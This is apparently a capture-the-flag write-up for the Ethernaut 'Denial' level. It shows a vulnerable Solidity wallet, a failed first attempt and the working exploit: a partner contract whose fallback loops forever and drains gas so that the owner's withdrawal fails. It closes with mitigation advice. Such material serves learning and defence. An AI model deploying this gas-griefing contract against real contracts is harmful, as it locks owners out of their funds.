# 20. Denial
Difficulty 5/10

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Process:
Referring: https://medium.com/hackernoon/hackpedia-16-solidity-hacks-vulnerabilities-their-fixes-and-real-world-examples-f3210eba5148  

3 types of DoS attacks
1. Attacker makes an array too large causing a function that loops through the array to exceed the block gas limit
2. Owner loses keys needed for a require function
3. Attack contract that does not accept ether required to progress state of the contract

Level contract does not look like 1 or 2. Making an attack contract in Remix (copied from 7. Force):
denialAttack.sol:  
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

then in console:
```
await contract.setWithdrawPartner([address of denialAttack])
```

This does not work because like the comments say, recipient can revert while the owner still gets their share. Even if `partner.call{value:amountToSend}("")` fails, `owner.transfer(amountToSend)` still goes through.

Got stuck here and found solution on OpenZeppelin forums:
denialAttack.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {

  fallback() payable external{
      while(true) {

      }
  }
}
```

deploy on remix and setting withdraw partner to this contract.  

**End**
Level completed!
Difficulty 5/10

This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.

If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().

Typically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

Note: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.